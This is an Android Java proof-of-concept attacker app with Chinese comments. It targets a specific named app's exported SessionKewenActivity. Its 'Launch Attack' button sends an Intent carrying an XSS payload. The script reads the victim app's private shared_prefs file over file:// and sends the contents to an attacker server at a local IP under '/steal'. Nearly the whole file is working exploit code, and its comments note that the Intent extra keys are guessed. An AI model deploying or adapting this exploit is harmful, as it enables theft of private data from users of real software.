package com.example.attacker;

import android.app.Activity;
import android.content.ComponentName;
import android.content.Intent;
import android.os.Bundle;
import android.os.Parcel;
import android.os.Parcelable;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.Toast;

import java.util.ArrayList;
import java.util.List;

public class MainActivity extends Activity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        Button btn = new Button(this);
        btn.setText("Launch Attack");
        setContentView(btn);

        btn.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                launchAttack();
            }
        });
    }

    private void launchAttack() {
        try {
            // 目标组件
            ComponentName target = new ComponentName("com.pep.riyuxunlianying", "com.pep.riyuxunlianying.activity.SessionKewenActivity");
            
            Intent intent = new Intent();
            intent.setComponent(target);
            
            // 构造恶意 Payload (XSS -> File Theft)
            // 将 <YOUR_PC_IP> 替换为你的服务器 IP
            String maliciousJs = "<script>" +
                    "var request = new XMLHttpRequest();" +
                    "var file_path = 'file:///data/data/com.pep.riyuxunlianying/shared_prefs/CobubRazor_SharedPref.xml';" +
                    "request.open('GET', file_path, false);" +
                    "request.send(null);" +
                    "var result = request.responseText;" +
                    "var exfiltrate = new XMLHttpRequest();" +
                    "exfiltrate.open('GET', 'http://192.168.31.8:8000/steal?data=' + encodeURIComponent(result), false);" +
                    "exfiltrate.send(null);" +
                    "</script>";

            // 模拟 SessionKewen 对象结构
            // 注意：这需要攻击者在自己的 App 中定义与目标 App 相同的包名和类名的 Parcelable 对象，
            // 或者使用反射/动态代理来构造 Intent。
            // 为了简化 PoC，这里假设我们可以通过 "extra_session_kewen" (猜测的 key) 传递数据
            // 在实际攻击中，需要反编译目标 App 获取准确的 Parcelable 定义。
            
            // 尝试直接传递 HTML 字符串 (如果目标有逻辑处理 String extra)
            intent.putExtra("contents", maliciousJs);
            intent.putExtra("url", maliciousJs);
            
            // 如果必须传递复杂对象，代码会非常复杂，通常需要构建一个包含相同类定义的 APK。
            
            startActivity(intent);
            Log.d("Attacker", "Attack Intent sent!");
            Toast.makeText(this, "Attack Sent!", Toast.LENGTH_SHORT).show();
            
        } catch (Exception e) {
            e.printStackTrace();
            Toast.makeText(this, "Attack Failed: " + e.getMessage(), Toast.LENGTH_LONG).show();
        }
    }
}